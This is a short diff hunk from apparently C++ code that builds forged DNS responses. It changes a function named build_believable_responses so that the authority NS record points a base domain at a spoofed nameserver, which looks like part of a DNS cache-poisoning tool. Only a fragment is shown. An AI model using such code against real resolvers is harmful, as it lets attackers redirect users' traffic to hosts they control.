@@ -117,11 +117,11 @@ bool build_believable_responses(std::string sarcasm, std::string author_dns, std
 		//build authoritative record field
 
 		DNS::Resource authority_field;
-		authority_field.dname(sarcasm);
+		authority_field.dname(basedomain);
 		authority_field.ttl(ttl_val);
 		authority_field.type(DNS::NS);
 		authority_field.query_class(DNS::IN);
-		authority_field.data(claim_domain);
+		authority_field.data(spoof_dns);
 
 		resp_pkt.rfind_pdu<DNS>().add_authority( authority_field );
 
